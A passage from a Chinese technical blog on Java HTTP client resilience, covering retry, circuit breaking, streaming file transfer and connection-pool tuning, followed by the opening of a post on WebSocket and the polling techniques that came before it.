<li><strong>Spring <code>WebClient</code> &#x2F; <code>RestTemplate</code></strong>: 通常不直接提供重试，而是推荐与<code>Resilience4j</code>或<code>Spring Retry</code>等专门的库结合使用。</li>
</ul>
<p><strong>高级重试策略</strong>:</p>
<ul>
<li><strong>指数退避 (Exponential Backoff)</strong>: 每次重试的间隔时间逐渐增加（例如，1s, 2s, 4s, …），避免在下游服务过载时以高频率的重试“轰炸”它，给它恢复的时间。</li>
<li><strong>增加抖动 (Jitter)</strong>: 在退避间隔上增加一个随机值，可以防止多个客户端在同一时刻同步重试，从而打散重试请求，避免产生“惊群效应”（Thundering Herd）。</li>
<li><strong>组合使用</strong>: <code>Exponential Backoff + Jitter</code>是业界公认的最佳重试策略。</li>
</ul>
<hr>
<h3 id="4-3-熔断降级"><a href="#4-3-熔断降级" class="headerlink" title="4.3 熔断降级"></a>4.3 熔断降级</h3><p>重试只能解决瞬时故障，如果下游服务长时间不可用或持续返回错误，无休止的重试不仅无效，还会耗尽我们自身服务的线程和连接资源，最终导致我们的服务也被拖垮，并向上游蔓延，引发<strong>雪崩效应 (Cascading Failures)</strong>。</p>
<p>**熔断器（Circuit Breaker）**就是为了解决这个问题而设计的。</p>
<p><strong>工作原理（三态机）：</strong></p>
<ol>
<li><strong>Closed (闭合状态)</strong>: 正常状态，允许所有请求通过。熔断器会统计最近一段时间内的请求成功率和失败率。</li>
<li><strong>Open (断开状态)</strong>: 当失败率超过预设的阈值时，熔断器“跳闸”，进入断开状态。在此状态下，<strong>所有后续请求都会被立即拒绝（快速失败）</strong>，而不会真正发送到下游服务。这保护了我们的应用，也给了下游服务恢复的时间。</li>
<li><strong>Half-Open (半开状态)</strong>: 在断开状态持续一段时间后，熔断器进入半开状态。它会尝试性地放行一小部分请求。<ul>
<li>如果这些请求成功，熔断器认为下游服务已恢复，切换回<strong>闭合状态</strong>。</li>
<li>如果这些请求仍然失败，熔断器认为下游服务还未恢复，切换回<strong>断开状态</strong>，开始新一轮的等待。</li>
</ul>
</li>
</ol>
<p><strong>降级（Fallback）</strong>:</p>
<p>当请求因为熔断、超时或业务异常而失败时，我们可以提供一个降级逻辑，而不是直接向用户返回一个冷冰冰的错误。例如：</p>
<ul>
<li>返回一个缓存的旧数据。</li>
<li>返回一个默认的、通用的响应。</li>
<li>调用另一个备用的服务。</li>
</ul>
<p><strong>如何实现：</strong></p>
<ul>
<li><strong>Resilience4j</strong>: Java生态中最流行、最强大的容错库之一，Spring Cloud官方推荐。它提供了熔断器、重试、舱壁隔离（Bulkhead）、限流（RateLimiter）等多种模式。</li>
<li><strong>Sentinel</strong>: 由阿里巴巴开源，专注于流量控制和熔断降级，功能强大，尤其在处理流量整形和热点参数限流方面有独到之处。</li>
</ul>
<p><strong>示例：使用Resilience4j为<code>WebClient</code>添加熔断</strong></p>
<ol>
<li><p><strong>引入依赖</strong>: <code>spring-cloud-starter-circuitbreaker-reactor-resilience4j</code></p>
</li>
<li><p><strong>配置</strong>: 在<code>application.yml</code>中为熔断器实例进行详细配置。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">resilience4j:</span></span><br><span class="line">  <span class="attr">circuitbreaker:</span></span><br><span class="line">    <span class="attr">instances:</span></span><br><span class="line">      <span class="attr">downstream-service-a:</span></span><br><span class="line">        <span class="attr">sliding-window-type:</span> <span class="string">count-based</span></span><br><span class="line">        <span class="attr">sliding-window-size:</span> <span class="number">20</span> <span class="comment"># 统计最近20个请求</span></span><br><span class="line">        <span class="attr">failure-rate-threshold:</span> <span class="number">50</span> <span class="comment"># 失败率超过50%则跳闸</span></span><br><span class="line">        <span class="attr">wait-duration-in-open-state:</span> <span class="string">10s</span> <span class="comment"># 跳闸后等待10秒进入半开</span></span><br><span class="line">        <span class="attr">permitted-number-of-calls-in-half-open-state:</span> <span class="number">5</span> <span class="comment"># 半开状态下允许5个请求</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>代码集成</strong>: 使用<code>.transform()</code>方法将熔断逻辑包装到<code>WebClient</code>调用链中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> ReactiveCircuitBreakerFactory cbFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Mono&lt;User&gt; <span class="title function_">getUserWithFallback</span><span class="params">(String userId)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> webClient.get().uri(<span class="string">&quot;/users/&#123;id&#125;&quot;</span>, userId)</span><br><span class="line">            .retrieve()</span><br><span class="line">            .bodyToMono(User.class)</span><br><span class="line">            .transform(it -&gt; cbFactory.create(<span class="string">&quot;downstream-service-a&quot;</span>).run(it, throwable -&gt; &#123;</span><br><span class="line">                <span class="comment">// 这是降级逻辑 (Fallback)</span></span><br><span class="line">                System.err.println(<span class="string">&quot;Circuit breaker is open or call failed. Falling back.&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> Mono.just(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;default-user&quot;</span>, <span class="string">&quot;Default User&quot;</span>));</span><br><span class="line">            &#125;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>通过组合使用超时、重试和熔断降级，可以构建一个极具弹性的HTTP调用层，从容应对分布式环境中的各种不确定性。</p>
<hr>
<h2 id="5-性能优化"><a href="#5-性能优化" class="headerlink" title="5. 性能优化"></a>5. 性能优化</h2><h3 id="5-1-大文件与流式处理"><a href="#5-1-大文件与流式处理" class="headerlink" title="5.1 大文件与流式处理"></a>5.1 大文件与流式处理</h3><p>在处理大文件上传或下载时，最常见的错误就是<strong>试图将整个文件内容一次性读入内存</strong>。一个几GB的大文件会迅速耗尽JVM的堆内存，导致<code>OutOfMemoryError</code>（OOM），使整个应用崩溃。正确的做法是使用<strong>流式处理（Streaming）</strong>。</p>
<p><strong>流式上传</strong></p>
<ul>
<li><p><strong>核心思想</strong>: 不要将文件内容先读入一个<code>byte[]</code>，而是直接将文件的<code>InputStream</code>作为请求体。HTTP客户端会以分块（Chunked Transfer Encoding）的方式，边从文件读取数据，边将其发送到网络，内存占用极低。</p>
</li>
<li><p><strong>Apache HttpClient</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HttpPost</span> <span class="variable">httpPost</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpPost</span>(<span class="string">&quot;https://example.com/upload&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;large-file.zip&quot;</span>);</span><br><span class="line"><span class="comment">// 使用InputStreamEntity，它会从输入流中读取数据</span></span><br><span class="line"><span class="type">InputStreamEntity</span> <span class="variable">reqEntity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamEntity</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file), file.length(), ContentType.APPLICATION_OCTET_STREAM);</span><br><span class="line">reqEntity.setChunked(<span class="literal">true</span>); <span class="comment">// 明确开启分块传输</span></span><br><span class="line">httpPost.setEntity(reqEntity);</span><br><span class="line"></span><br><span class="line">client.execute(httpPost);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>OkHttp</strong>:<br><code>RequestBody</code>提供了静态工厂方法，可以直接接收<code>File</code>或<code>InputStream</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;large-file.zip&quot;</span>);</span><br><span class="line"><span class="type">MediaType</span> <span class="variable">MEDIA_TYPE_OCTET</span> <span class="operator">=</span> MediaType.parse(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// OkHttp内部会自动处理流式读取和分块传输</span></span><br><span class="line"><span class="type">RequestBody</span> <span class="variable">requestBody</span> <span class="operator">=</span> RequestBody.create(file, MEDIA_TYPE_OCTET);</span><br><span class="line"></span><br><span class="line"><span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">    .url(<span class="string">&quot;https://example.com/upload&quot;</span>)</span><br><span class="line">    .post(requestBody)</span><br><span class="line">    .build();</span><br><span class="line"></span><br><span class="line">client.newCall(request).execute();</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Spring <code>WebClient</code></strong>:<br><code>WebClient</code>与响应式流深度集成，可以优雅地处理大文件。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.core.io.buffer.DataBuffer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.buffer.DataBufferUtils;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"></span><br><span class="line"><span class="type">Path</span> <span class="variable">filePath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;large-file.zip&quot;</span>);</span><br><span class="line"><span class="comment">// DataBufferUtils.read()会返回一个Flux&lt;DataBuffer&gt;，以响应式流的方式读取文件</span></span><br><span class="line">Flux&lt;DataBuffer&gt; fileFlux = DataBufferUtils.read(filePath, <span class="keyword">new</span> <span class="title class_">DefaultDataBufferFactory</span>(), <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">webClient.post()</span><br><span class="line">    .uri(<span class="string">&quot;/upload&quot;</span>)</span><br><span class="line">    .contentType(MediaType.APPLICATION_OCTET_STREAM)</span><br><span class="line">    .body(fileFlux, DataBuffer.class)</span><br><span class="line">    .retrieve()</span><br><span class="line">    .bodyToMono(Void.class)</span><br><span class="line">    .block();</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>流式下载</strong></p>
<ul>
<li><p><strong>核心思想</strong>: 不要试图用<code>.string()</code>或<code>.bytes()</code>将整个响应体读入内存。而是获取响应体的<code>InputStream</code>，然后以小块缓冲区（buffer）的方式边读边处理（例如，写入到本地文件）。</p>
</li>
<li><p><strong>Apache HttpClient</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HttpGet</span> <span class="variable">httpGet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(<span class="string">&quot;https://example.com/download/large-file.zip&quot;</span>);</span><br><span class="line"><span class="keyword">try</span> (<span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.execute(httpGet)) &#123;</span><br><span class="line">    <span class="type">HttpEntity</span> <span class="variable">entity</span> <span class="operator">=</span> response.getEntity();</span><br><span class="line">    <span class="keyword">if</span> (entity != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取响应的输入流</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> entity.getContent();</span><br><span class="line">             <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;downloaded-file.zip&quot;</span>)) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line">            <span class="comment">// 循环读写，内存占用恒定</span></span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                outputStream.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>EntityUtils.consume(entity)</code>可以确保在出错时也释放连接。</p>
</li>
<li><p><strong>OkHttp</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder().url(<span class="string">&quot;https://example.com/download/large-file.zip&quot;</span>).build();</span><br><span class="line"><span class="keyword">try</span> (<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> client.newCall(request).execute()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!response.isSuccessful()) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unexpected code &quot;</span> + response);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取响应体的字节流</span></span><br><span class="line">    <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> response.body().byteStream();</span><br><span class="line">         <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;downloaded-file.zip&quot;</span>)) &#123;</span><br><span class="line">         </span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">        <span class="type">int</span> bytesRead;</span><br><span class="line">        <span class="keyword">while</span> ((bytesRead = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            outputStream.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>JDK 11+ HttpClient</strong>:<br><code>BodyHandlers.ofFile(Path)</code>是处理大文件下载的最佳方式，它在内部实现了流式写入，完全避免了OOM。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HttpResponse&lt;Path&gt; response = client.send(request, HttpResponse.BodyHandlers.ofFile(Paths.get(<span class="string">&quot;downloaded-file.zip&quot;</span>)));</span><br><span class="line"><span class="comment">// 请求执行完毕，文件已保存</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="5-2-连接池参数调优"><a href="#5-2-连接池参数调优" class="headerlink" title="5.2 连接池参数调优"></a>5.2 连接池参数调优</h3><p>HTTP客户端的默认连接池配置通常是为通用场景设计的，可能不适合你的特定高并发应用。不合理的连接池配置是导致性能瓶颈的常见原因。<strong>调优必须基于数据，而不是凭空猜测</strong>。</p>
<p><strong>核心调优参数：</strong></p>
<ul>
<li><strong>最大总连接数 (<code>MaxTotal</code>)</strong>:<ul>
<li><strong>含义</strong>: 整个HTTP客户端实例能创建的总连接数上限。</li>
<li><strong>影响</strong>: 设置过小，在高并发时会导致大量请求等待连接，增加延迟（<code>Pending Connections</code>指标升高）。设置过大，会消耗更多的客户端内存和文件句柄，并可能对所有下游服务造成过大压力。</li>
<li><strong>调优</strong>: 应大于所有路由的<code>MaxPerRoute</code>之和，并根据压测时观察到的总并发请求数来设定。</li>
</ul>
</li>
<li><strong>每路由最大连接数 (<code>DefaultMaxPerRoute</code> &#x2F; <code>MaxPerRoute</code>)</strong>:<ul>
<li><strong>含义</strong>: 到达<strong>同一个目标主机+端口</strong>的并发连接数上限。</li>
<li><strong>影响</strong>: <strong>这是最重要的调优参数</strong>。如果你的应用主要调用少数几个下游服务，这个值直接决定了你对每个服务的最大并发调用能力。设置过小，会成为调用该服务的瓶颈。设置过大，可能会压垮下游服务。</li>
<li><strong>调优</strong>:<ol>
<li><strong>了解下游能力</strong>: 询问下游服务的提供方，他们能承受的最大并发连接数是多少。</li>
<li><strong>根据压测调整</strong>: 进行压力测试，观察<code>Pending Connections</code>指标。如果只针对某个特定服务的调用出现瓶颈，而总连接数远未达到上限，那么很可能是这个服务的<code>MaxPerRoute</code>设置过低。</li>
</ol>
</li>
</ul>
</li>
</ul>
<p><strong>调优步骤：</strong></p>
<ol>
<li><strong>建立监控</strong>: 如<code>3.1</code>节所述，必须先建立起对连接池（Active, Idle, Pending）的监控大盘。</li>
<li><strong>设定基线</strong>: 使用默认配置进行一次压力测试，记录下吞吐量（QPS&#x2F;TPS）、响应时间（P99延迟）和连接池各项指标的表现。</li>
<li><strong>分析瓶颈</strong>:<ul>
<li>如果<code>Pending Connections</code>持续大于0，且<code>Active Connections</code>达到了<code>MaxTotal</code>或某个<code>MaxPerRoute</code>的上限，说明连接池是瓶颈。</li>
<li>如果连接池指标很健康，但延迟依然很高，说明瓶颈可能在你的业务代码或下游服务本身。</li>
</ul>
</li>
<li><strong>调整参数</strong>:<ul>
<li>如果是<code>MaxPerRoute</code>瓶颈，逐步增加该值，例如从默认的20增加到50。</li>
<li>如果是<code>MaxTotal</code>瓶颈，相应地增加<code>MaxTotal</code>。</li>
</ul>
</li>
<li><strong>重复测试</strong>: 每次调整后，重新进行压测，观察新配置是否带来了性能提升，以及是否对下游服务产生了负面影响。</li>
<li><strong>找到拐点</strong>: 持续增加参数，直到吞吐量不再显著增加，或者响应时间开始恶化（可能是下游服务达到了极限），或者出现错误率上升。这个点就是你的最优配置区间。</li>
</ol>
<p><strong>经验法则</strong>:</p>
<ul>
<li>一个常见的错误是将<code>MaxTotal</code>设置得很高，但<code>DefaultMaxPerRoute</code>保持默认值（例如20）。当应用主要与一个服务通信时，实际最大并发数被限制在了20，远达不到预期。</li>
<li>调优是一个权衡过程，目的是在<strong>满足业务性能需求</strong>和<strong>保护下游服务</strong>之间找到平衡点。</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/18/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%BA%93/WebSocket/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冉丝堂">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="冉的技术宝典">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | 冉的技术宝典">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/18/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%BA%93/WebSocket/" class="post-title-link" itemprop="url">WebSocket</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-10-18 11:22:31" itemprop="dateCreated datePublished" datetime="2025-10-18T11:22:31+08:00">2025-10-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-21 09:38:51" itemprop="dateModified" datetime="2025-10-21T09:38:51+08:00">2025-10-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E4%B8%8E%E7%94%9F%E6%80%81/" itemprop="url" rel="index"><span itemprop="name">开发框架与生态</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="一、-实时通信的演进"><a href="#一、-实时通信的演进" class="headerlink" title="一、 实时通信的演进"></a>一、 实时通信的演进</h1><h2 id="1-HTTP-的无状态性"><a href="#1-HTTP-的无状态性" class="headerlink" title="1. HTTP 的无状态性"></a>1. HTTP 的无状态性</h2><p>我们在”HTTP协议“这一笔  记中介绍了HTTP的核心特点<strong>无状态</strong>，这里简单回顾一下</p>
<ul>
<li><strong>定义</strong>：“无状态”指的是<strong>协议本身对于事务处理没有记忆能力</strong>。每一次 HTTP 请求都是完全独立的，服务器不会保留前一次请求的任何信息。</li>
<li>**优点 **：<ul>
<li><strong>简化服务器设计</strong>：服务器不需要花费额外的资源（如内存）来存储海量的客户端状态信息。</li>
<li><strong>提升服务器的可伸缩性</strong>：由于服务器不存储状态，任何一台服务器都可以处理任何一个客户端的请求。这使得在服务器集群中做<strong>负载均衡</strong>变得非常容易。如果一台服务器宕机，请求可以无缝切换到另一台，因为新服务器不需要任何历史上下文。</li>
</ul>
</li>
<li><strong>缺点与解决方案</strong>：<ul>
<li><strong>功能受限</strong>：然而，现代 Web 应用（如购物车、用户登录）恰恰需要“记住状态”。</li>
<li><strong>解决方案</strong>：为了弥补 HTTP 的无状态性，Web 应用通过<strong>Cookie 和 Session 机制</strong>来“创造”状态。<ul>
<li><strong>Cookie</strong>: 服务器通过 <code>Set-Cookie</code> 响应头给客户端一个“通行证”（一小段文本）。</li>
<li>之后，客户端在每次请求时都会通过 <code>Cookie</code> 请求头带上这个“通行证”。</li>
<li>服务器通过检查这个“通行证”就能识别出用户，从而维持登录状态或购物车内容。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>HTTP 的无状态性和“客户端发起”的特性，对于需要 <strong>服务端主动推送信息</strong> 的实时应用（如在线聊天、股票行情、实时通知、游戏等）来说，就成了一个天然的障碍。</p>
<p>想象一下开发一个网页聊天室：</p>
<ul>
<li>用户 A 发送了一条消息。</li>
<li>服务器如何将这条新消息实时地告诉在线的其他用户 B 和 C？</li>
</ul>
<p>在纯粹的 HTTP 模型下，服务器无法做到这一点。因为服务器处理完 A 的“发送消息”请求后，就“忘记”了 B 和 C 的存在，它没有任何机制可以主动联系 B 和 C 并告诉他们：“嘿，有新消息了！”，虽然 <code>Cookie-Session</code> 机制解决了身份认证和会话保持的问题，但它并没有解决 <strong>服务端无法主动推送</strong> 这一根本性矛盾。</p>
<hr>
<h2 id="2-基于-HTTP-的伪实时通信"><a href="#2-基于-HTTP-的伪实时通信" class="headerlink" title="2. 基于 HTTP 的伪实时通信"></a>2. 基于 HTTP 的伪实时通信</h2><p>正如上一节所述，HTTP 的无状态性和“请求-响应”模式，天然地阻碍了服务端主动向客户端推送数据。然而，对实时性的需求是真实存在的。为了绕过这一限制，开发者们发明了一系列“模拟”实时通信的技术，它们统称为“伪实时通信”或“Comet”技术。这些方案的核心思想都是：<strong>既然服务器不能主动“推”，那就让客户端不知疲倦地“拉”</strong>。</p>
<hr>
<h3 id="2-1-短轮询-Short-Polling"><a href="#2-1-短轮询-Short-Polling" class="headerlink" title="2.1 短轮询 (Short Polling)"></a>2.1 短轮询 (Short Polling)</h3><p>短轮询是最简单、最直观的实现方式。</p>
<ul>
<li><p><strong>工作原理</strong>：</p>
<ol>
<li>客户端以一个固定的、较短的时间间隔（例如每隔 1-3 秒）向服务器发送一个 HTTP 请求，询问“是否有新消息？”。</li>
<li>服务器立即检查是否有新数据。</li>
<li><strong>如果有新数据</strong>，服务器将其放在 HTTP 响应中返回给客户端。</li>
<li><strong>如果没新数据</strong>，服务器也立即返回一个空的或表示“无新内容”的响应。</li>
<li>客户端收到响应后，无论有无数据，都会在等待预设的间隔时间后，再次发起下一次请求。这个过程会无限循环下去。</li>
</ol>
</li>
<li><p><strong>图解流程</strong>:</p>
<pre><code class="highlight mermaid">sequenceDiagram
    participant Client
    participant Server

    Client-&gt;&gt;Server: (1) Request
    Server--&gt;&gt;Client: (2) Response(No Data)
    note over Client: (wait 2s)

    Client-&gt;&gt;Server: (3) Request
    Server--&gt;&gt;Client: (4) Response(No Data)
    note over Client: (wait 2s)

    Client-&gt;&gt;Server: (5) Request
    note over Server: Has new data
    Server--&gt;&gt;Client: (6) Response(With Data)
    note over Client: (wait 2s)

    Client-&gt;&gt;Server: (7) Request
    note over Client,Server: ...</code></pre>
</li>
<li><p><strong>优点</strong>：</p>
<ul>
<li><strong>实现简单</strong>：前后端实现都非常容易，逻辑清晰。</li>
<li><strong>兼容性好</strong>：几乎所有浏览器都支持，没有兼容性问题。</li>
</ul>
</li>
<li><p><strong>缺点</strong>：</p>
<ul>
<li><strong>延迟性高</strong>：消息的实时性取决于轮询间隔。如果间隔设为3秒，那么一条消息最多会有3秒的延迟才能被客户端接收到。</li>
<li><strong>服务器压力大</strong>：无论有无新消息，客户端都会持续不断地发起请求，其中绝大多数是无效的“空请求”（无功请求），这会极大地消耗服务器的 CPU 和带宽资源。</li>
<li><strong>网络拥堵</strong>：大量的 HTTP 请求头（Header）在网络中传输，造成了不必要的带宽浪费。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-2-长轮询-Long-Polling"><a href="#2-2-长轮询-Long-Polling" class="headerlink" title="2.2 长轮询 (Long Polling)"></a>2.2 长轮询 (Long Polling)</h3><p>长轮询是短轮询的优化版，旨在减少无效请求，降低延迟。</p>
<ul>
<li><p><strong>工作原理</strong>：</p>
<ol>
<li>客户端向服务器发起一个请求，询问“是否有新消息？”。</li>
<li>服务器收到请求后，<strong>并不立即响应</strong>。它会“挂起”（hold）这个连接，检查是否有新数据。</li>
<li><strong>如果在一定超时时间（例如30秒）内有新数据</strong>，服务器立即将数据放入响应中，返回给客户端，并关闭当前连接。</li>
<li><strong>如果在超时时间内一直没有新数据</strong>，服务器会返回一个表示超时的空响应，并关闭当前连接。</li>
<li>客户端在收到响应（无论是带数据的还是超时的）后，会<strong>立即</strong>发起下一个长轮询请求。</li>
</ol>
</li>
<li><p><strong>图解流程</strong>:</p>
<pre><code class="highlight mermaid">sequenceDiagram
    participant Client
    participant Server

    Client-&gt;&gt;Server: (1) Request
    note over Server: Holds connection...

    note over Server: ... after 15s, new data arrives
    Server--&gt;&gt;Client: (2) Response(With Data)

    note over Client: Client immediately re-requests
    Client-&gt;&gt;Server: (3) Request
    note over Server: Holds connection...

    note over Server: ... after 30s, connection times out
    Server--&gt;&gt;Client: (4) Response(Timeout)

    note over Client: Client immediately re-requests
    Client-&gt;&gt;Server: (5) Request
    note over Server: Holds connection...
    note over Client, Server: ...</code></pre>
</li>
<li><p><strong>优点</strong>：</p>
<ul>
<li><strong>准实时性</strong>：一旦有数据，服务器会立即发送，大大降低了消息的延迟。</li>
<li><strong>减少无效请求</strong>：相比短轮询，极大地减少了客户端发起的请求总数，节省了网络带宽和服务器的瞬时处理压力。</li>
</ul>
</li>
<li><p><strong>缺点</strong>：</p>
<ul>
<li><strong>服务器资源占用</strong>：服务器需要长时间维持（hold）客户端的连接。在高并发场景下，大量的挂起连接会占用大量的服务器内存和线程（或其他连接句柄），容易导致服务器连接数耗尽，这是著名的 <strong>C10K 问题</strong> 的一个典型场景。</li>
<li><strong>实现相对复杂</strong>：服务器端需要管理连接的挂起、超时和唤醒，逻辑比短轮询复杂。</li>
<li><strong>消息传递仍有延迟</strong>：每次数据传输后，连接会断开，客户端需要重新建立连接，这个过程（TCP握手、HTTP请求）仍然存在开销和延迟。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-3-HTTP-流-HTTP-Streaming"><a href="#2-3-HTTP-流-HTTP-Streaming" class="headerlink" title="2.3 HTTP 流 (HTTP Streaming)"></a>2.3 HTTP 流 (HTTP Streaming)</h3><p>这是一种更为激进的方案，试图在单个 HTTP 连接上实现持续的数据传输。</p>
<ul>
